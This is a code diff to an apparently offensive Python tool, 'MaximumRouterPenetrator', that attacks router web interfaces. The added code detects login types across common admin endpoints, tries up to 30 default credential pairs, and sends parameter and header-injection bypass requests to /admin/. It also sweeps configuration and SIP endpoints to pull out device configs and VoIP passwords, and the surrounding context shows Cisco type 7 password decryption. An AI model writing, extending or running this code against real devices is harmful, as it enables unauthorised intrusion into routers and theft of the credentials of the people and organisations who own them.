@@ -115,6 +115,9 @@ class MaximumRouterPenetrator:
         # SIP password protection bypass system
         self.sip_password_bypass = self._build_sip_password_bypass_system()
         
+        # Authentication detection system
+        self.auth_detection_system = self._build_authentication_detection_system()
+        
         # Cisco decryption
         self.cisco_type7_xlat = [
             0x64, 0x73, 0x66, 0x64, 0x3b, 0x6b, 0x66, 0x6f, 0x41, 0x2c, 0x2e,
@@ -811,7 +814,7 @@ class MaximumRouterPenetrator:
         
         # Step 5: Advanced bypass attempts
         if verbose:
-            print(f"         Testing advanced bypasses...")
+            print(f"         🔓 LIVE DEBUG: Testing advanced bypass techniques...")
         
         bypass_result = self._test_advanced_bypasses(target_ip, verbose)
         result['techniques_attempted'].append('advanced_bypass')
@@ -824,7 +827,7 @@ class MaximumRouterPenetrator:
         
         # Step 6: Direct endpoint exploitation
         if verbose:
-            print(f"         Testing direct endpoints...")
+            print(f"         📡 LIVE DEBUG: Testing direct endpoint access...")
         
         direct_result = self._test_direct_endpoints(target_ip, verbose)
         result['techniques_attempted'].append('direct_endpoints')
@@ -1084,16 +1087,48 @@ class MaximumRouterPenetrator:
         return cve_result
     
     def _test_verified_credentials(self, ip: str, router_info: Dict, verbose: bool) -> Dict[str, Any]:
-        """Test credentials with REAL verification"""
+        """Test credentials with REAL verification and authentication detection"""
         auth_result = {'verified_access': False}
         
-        # Test priority credentials first
-        all_credentials = self.priority_credentials + self.comprehensive_credentials
+        # Step 1: Detect authentication types
+        auth_info = self._detect_authentication_type(ip, verbose)
+        auth_result['auth_detection'] = auth_info
+        
+        if not auth_info['login_endpoints']:
+            if verbose:
+                print(f"         ❌ LIVE DEBUG: No login endpoints found")
+            return auth_result
+        
+        # Build unique credential list (remove duplicates)
+        unique_credentials = []
+        seen_credentials = set()
+        
+        # Add priority credentials first
+        for cred in self.priority_credentials:
+            if isinstance(cred, tuple) and len(cred) == 2:
+                username, password = cred
+                cred_key = f"{username}:{password}"
+                if cred_key not in seen_credentials:
+                    unique_credentials.append((username, password))
+                    seen_credentials.add(cred_key)
+        
+        # Add comprehensive credentials (avoid duplicates)
+        for cred in self.comprehensive_credentials:
+            if isinstance(cred, tuple) and len(cred) == 2:
+                username, password = cred
+                cred_key = f"{username}:{password}"
+                if cred_key not in seen_credentials:
+                    unique_credentials.append((username, password))
+                    seen_credentials.add(cred_key)
+        
+        # Limit for efficiency
+        test_credentials = unique_credentials[:30]
         
         if verbose:
-            print(f"         🔑 LIVE DEBUG: Testing {len(all_credentials[:30])} credential combinations...")
+            print(f"         🔑 LIVE DEBUG: Testing {len(test_credentials)} unique credential combinations...")
+            print(f"         🔑 LIVE DEBUG: Priority: {len(self.priority_credentials)}, Total unique: {len(unique_credentials)}")
         
-        for i, (username, password) in enumerate(all_credentials[:30], 1):  # Limit for efficiency
+        for i, (username, password) in enumerate(test_credentials, 1):
             if verbose:
                 print(f"         🔑 LIVE DEBUG: [{i}/30] Testing: {username}:{password}")
             
@@ -1279,13 +1314,19 @@ class MaximumRouterPenetrator:
         return sip_result
     
     def _test_advanced_bypasses(self, ip: str, verbose: bool) -> Dict[str, Any]:
-        """Test advanced bypass techniques"""
-        bypass_result = {'success': False}
+        """Test advanced bypass techniques with live debugging"""
+        bypass_result = {'success': False, 'attempts': []}
+        
+        if verbose:
+            print(f"            🔍 Testing parameter-based bypasses...")
         
         # Try parameter-based bypasses
         for param in self.advanced_bypasses['parameter_bypass']:
             try:
                 url = f"http://{ip}/admin/?{param}"
+                
+                if verbose:
+                    print(f"               🔗 Testing: {param}")
                 
                 if REQUESTS_AVAILABLE:
                     response = requests.get(url, timeout=3)
@@ -1302,10 +1343,52 @@ class MaximumRouterPenetrator:
                         }
                         
                         if verbose:
-                            print(f"            ✅ Parameter bypass: {param}")
+                            print(f"               ✅ SUCCESS: Parameter bypass with {param}")
                         return bypass_result
-            except:
+                    else:
+                        if verbose:
+                            print(f"               ❌ Failed: HTTP {response.status_code}")
+            except Exception as e:
+                if verbose:
+                    print(f"               ❌ Error: {str(e)}")
                 continue
+        
+        if verbose:
+            print(f"            🔍 Testing header-based bypasses...")
+        
+        # Try header-based bypasses
+        for header_dict in self.advanced_bypasses['header_injection'][:5]:  # Limit for performance
+            try:
+                header_name = list(header_dict.keys())[0]
+                if verbose:
+                    print(f"               🔗 Testing header: {header_name}")
+                
+                if REQUESTS_AVAILABLE:
+                    response = requests.get(f"http://{ip}/admin/", headers=header_dict, timeout=3)
+                    
+                    if (response.status_code == 200 and
+                        any(indicator in response.text.lower() 
+                           for indicator in ['admin', 'configuration', 'system'])):
+                        
+                        bypass_result = {
+                            'success': True,
+                            'method': f'header_injection_{header_name}',
+                            'content': response.text
+                        }
+                        
+                        if verbose:
+                            print(f"               ✅ SUCCESS: Header bypass with {header_name}")
+                        return bypass_result
+                    else:
+                        if verbose:
+                            print(f"               ❌ Failed: HTTP {response.status_code}")
+            except Exception as e:
+                if verbose:
+                    print(f"               ❌ Error: {str(e)}")
+                continue
+        
+        if verbose:
+            print(f"            ❌ All bypass attempts failed")
         
         return bypass_result
     
@@ -1455,17 +1538,23 @@ class MaximumRouterPenetrator:
         }
     
     def _test_direct_endpoints(self, ip: str, verbose: bool) -> Dict[str, Any]:
-        """Test direct endpoint access"""
-        direct_result = {'success': False, 'content': ''}
+        """Test direct endpoint access with live debugging"""
+        direct_result = {'success': False, 'content': '', 'attempts': []}
         
         # Test config endpoints
-        all_endpoints = (self.maximum_endpoints['config_access'] + 
-                        self.maximum_endpoints['sip_endpoints'] +
-                        self.maximum_endpoints['bypass_endpoints'])
+        config_endpoints = self.maximum_endpoints['config_access'][:20]  # Limit for performance
+        sip_endpoints = self.maximum_endpoints['sip_endpoints'][:15]
+        bypass_endpoints = self.maximum_endpoints['bypass_endpoints'][:10]
         
-        for endpoint in all_endpoints[:100]:  # Limit for performance
+        if verbose:
+            print(f"            🔍 Testing configuration endpoints...")
+        
+        for endpoint in config_endpoints:
             try:
                 url = f"http://{ip}{endpoint}"
+                
+                if verbose:
+                    print(f"               🔗 Testing: {endpoint}")
                 
                 if REQUESTS_AVAILABLE:
                     response = requests.get(url, timeout=2)
@@ -1486,15 +1575,75 @@ class MaximumRouterPenetrator:
                             'success': True,
                             'endpoint': endpoint,
                             'content': content,
-                            'url': url
+                            'url': url,
+                            'type': 'config_access'
                         }
                         
                         if verbose:
-                            print(f"            ✅ Direct access: {endpoint}")
-                        break
+                            print(f"               ✅ SUCCESS: Config access at {endpoint}")
+                        return direct_result
+                    else:
+                        if verbose:
+                            print(f"               ❌ Low quality content (indicators: {found})")
+                else:
+                    if verbose:
+                        print(f"               ❌ HTTP {status} or empty content")
             
-            except:
+            except Exception as e:
+                if verbose:
+                    print(f"               ❌ Error: {str(e)}")
                 continue
+        
+        if verbose:
+            print(f"            🔍 Testing SIP endpoints...")
+        
+        for endpoint in sip_endpoints:
+            try:
+                url = f"http://{ip}{endpoint}"
+                
+                if verbose:
+                    print(f"               🔗 Testing: {endpoint}")
+                
+                if REQUESTS_AVAILABLE:
+                    response = requests.get(url, timeout=2)
+                    content = response.text
+                    status = response.status_code
+                else:
+                    response = urllib.request.urlopen(url, timeout=2)
+                    content = response.read().decode('utf-8', errors='ignore')
+                    status = response.status
+                
+                if status == 200 and len(content) > 50:
+                    # Check for SIP indicators
+                    sip_indicators = ['sip', 'voip', 'voice', 'register', 'proxy', 'username', 'password']
+                    found = sum(1 for ind in sip_indicators if ind.lower() in content.lower())
+                    
+                    if found >= 2:
+                        direct_result = {
+                            'success': True,
+                            'endpoint': endpoint,
+                            'content': content,
+                            'url': url,
+                            'type': 'sip_access'
+                        }
+                        
+                        if verbose:
+                            print(f"               ✅ SUCCESS: SIP access at {endpoint}")
+                        return direct_result
+                    else:
+                        if verbose:
+                            print(f"               ❌ No SIP indicators (found: {found})")
+                else:
+                    if verbose:
+                        print(f"               ❌ HTTP {status} or empty content")
+            
+            except Exception as e:
+                if verbose:
+                    print(f"               ❌ Error: {str(e)}")
+                continue
+        
+        if verbose:
+            print(f"            ❌ All direct endpoint tests failed")
         
         return direct_result
     
@@ -1810,6 +1959,197 @@ class MaximumRouterPenetrator:
                 print(f"               ❌ Password bypass error: {str(e)}")
         
         return revealed_passwords
+    
+    def _build_authentication_detection_system(self) -> Dict[str, Any]:
+        """Build comprehensive authentication detection system"""
+        return {
+            # 7 Main Authentication Types
+            'auth_types': {
+                'http_basic': {
+                    'indicators': [
+                        'www-authenticate: basic',
+                        'authorization: basic',
+                        'realm=',
+                        'http status 401'
+                    ],
+                    'test_method': 'http_basic_auth',
+                    'priority': 1
+                },
+                'http_digest': {
+                    'indicators': [
+                        'www-authenticate: digest',
+                        'authorization: digest',
+                        'nonce=',
+                        'qop='
+                    ],
+                    'test_method': 'http_digest_auth',
+                    'priority': 2
+                },
+                'form_based': {
+                    'indicators': [
+                        '<form',
+                        'type="password"',
+                        'name="password"',
+                        'name="username"',
+                        'method="post"'
+                    ],
+                    'test_method': 'form_based_auth',
+                    'priority': 3
+                },
+                'api_based': {
+                    'indicators': [
+                        'application/json',
+                        '"token"',
+                        '"auth"',
+                        'api/login',
+                        'api/auth'
+                    ],
+                    'test_method': 'api_based_auth',
+                    'priority': 4
+                },
+                'redirect_based': {
+                    'indicators': [
+                        'location:',
+                        'redirect',
+                        'http status 302',
+                        'http status 301'
+                    ],
+                    'test_method': 'redirect_based_auth',
+                    'priority': 5
+                },
+                'javascript_based': {
+                    'indicators': [
+                        'javascript',
+                        'ajax',
+                        'xmlhttprequest',
+                        'fetch(',
+                        'login.js'
+                    ],
+                    'test_method': 'javascript_based_auth',
+                    'priority': 6
+                },
+                'cookie_based': {
+                    'indicators': [
+                        'set-cookie:',
+                        'session',
+                        'auth_token',
+                        'login_token'
+                    ],
+                    'test_method': 'cookie_based_auth',
+                    'priority': 7
+                }
+            },
+            
+            # Common login endpoints
+            'login_endpoints': [
+                '/', '/admin/', '/login/', '/auth/',
+                '/cgi-bin/login.cgi', '/login.html', '/login.php',
+                '/admin/login.asp', '/admin/index.asp', '/admin.html',
+                '/management/', '/config/', '/setup/',
+                '/api/login', '/api/auth', '/api/v1/auth'
+            ],
+            
+            # Login form patterns
+            'login_patterns': [
+                r'<form[^>]*action=["\']([^"\']*login[^"\']*)["\']',
+                r'<form[^>]*action=["\']([^"\']*auth[^"\']*)["\']',
+                r'<form[^>]*action=["\']([^"\']*admin[^"\']*)["\']',
+                r'action=["\']([^"\']*\.cgi)["\']',
+                r'action=["\']([^"\']*\.php)["\']'
+            ]
+        }
+    
+    def _detect_authentication_type(self, ip: str, verbose: bool) -> Dict[str, Any]:
+        """Detect authentication type and login endpoints"""
+        auth_info = {
+            'detected_types': [],
+            'login_endpoints': [],
+            'primary_auth_type': None,
+            'detection_details': []
+        }
+        
+        if verbose:
+            print(f"         🔐 LIVE DEBUG: Detecting authentication types...")
+        
+        try:
+            # Test common endpoints
+            for endpoint in self.auth_detection_system['login_endpoints']:
+                try:
+                    if verbose:
+                        print(f"            🔍 Testing endpoint: {endpoint}")
+                    
+                    if REQUESTS_AVAILABLE:
+                        response = requests.get(f"http://{ip}{endpoint}", 
+                                              timeout=3, allow_redirects=False)
+                        content = response.text.lower()
+                        headers = {k.lower(): v.lower() for k, v in response.headers.items()}
+                        status = response.status_code
+                    else:
+                        response = urllib.request.urlopen(f"http://{ip}{endpoint}", timeout=3)
+                        content = response.read().decode('utf-8', errors='ignore').lower()
+                        headers = {}
+                        status = 200
+                    
+                    # Analyze response for auth types
+                    detected_types = []
+                    
+                    for auth_type, config in self.auth_detection_system['auth_types'].items():
+                        score = 0
+                        for indicator in config['indicators']:
+                            if indicator.lower() in content or indicator.lower() in str(headers):
+                                score += 1
+                        
+                        if score >= 2:  # At least 2 indicators
+                            detected_types.append({
+                                'type': auth_type,
+                                'score': score,
+                                'priority': config['priority'],
+                                'method': config['test_method']
+                            })
+                            
+                            if verbose:
+                                print(f"               ✅ Auth type detected: {auth_type.upper()} (score: {score})")
+                    
+                    if detected_types:
+                        auth_info['login_endpoints'].append({
+                            'endpoint': endpoint,
+                            'status': status,
+                            'auth_types': detected_types
+                        })
+                        
+                        auth_info['detected_types'].extend(detected_types)
+                        
+                        # Set primary auth type (highest priority)
+                        if not auth_info['primary_auth_type']:
+                            best_type = min(detected_types, key=lambda x: x['priority'])
+                            auth_info['primary_auth_type'] = best_type
+                
+                except Exception as e:
+                    if verbose:
+                        print(f"               ❌ Endpoint test failed: {str(e)}")
+                    continue
+            
+            # Determine best authentication method
+            if auth_info['detected_types']:
+                # Sort by priority and score
+                sorted_types = sorted(auth_info['detected_types'], 
+                                    key=lambda x: (x['priority'], -x['score']))
+                auth_info['primary_auth_type'] = sorted_types[0]
+                
+                if verbose:
+                    primary = auth_info['primary_auth_type']
+                    print(f"         ✅ LIVE DEBUG: Primary auth type: {primary['type'].upper()}")
+                    print(f"         📊 LIVE DEBUG: Login endpoints found: {len(auth_info['login_endpoints'])}")
+            else:
+                if verbose:
+                    print(f"         ❌ LIVE DEBUG: No authentication types detected")
+        
+        except Exception as e:
+            if verbose:
+                print(f"         ❌ LIVE DEBUG: Auth detection error: {str(e)}")
+            auth_info['detection_details'].append(f"Error: {str(e)}")
+        
+        return auth_info
     
     def _extract_and_verify_sip(self, content: str, ip: str, verbose: bool) -> Dict[str, Any]:
         """Extract and verify SIP data"""
